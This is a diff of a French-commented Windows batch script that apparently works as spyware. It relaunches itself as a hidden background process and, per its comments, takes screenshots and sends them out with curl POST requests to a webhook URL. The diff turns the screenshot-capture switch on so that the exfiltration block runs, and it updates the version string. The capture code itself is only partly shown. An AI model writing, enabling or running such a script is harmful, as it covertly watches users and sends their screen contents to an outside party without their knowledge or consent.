@@ -1,7 +1,7 @@
 @echo off
 if not "%1"=="hide" start /B cmd /c "%~0" hide & exit
 setlocal enabledelayedexpansion
-::salute num 777
+::salute num 888
 
 
 set debutchemin=%~dp0
@@ -25,7 +25,7 @@ set DESTINATION=WebHook.bat
 
 
 
-set version=2025-01-31T22
+set version=2025-02-01T10
 
 
 set photo=true
@@ -64,7 +64,7 @@ if %message%==true (
 
 
 
-if %photo%==false (
+if %photo%==true (
     :: Si "photo" est égal à 1, prend une capture d'écran et l'envoie
     curl -H "Content-Type: application/json" -X POST -d "{\"content\":\"Lancement_des_capture\"}" %WEBHOOK_URL%
 
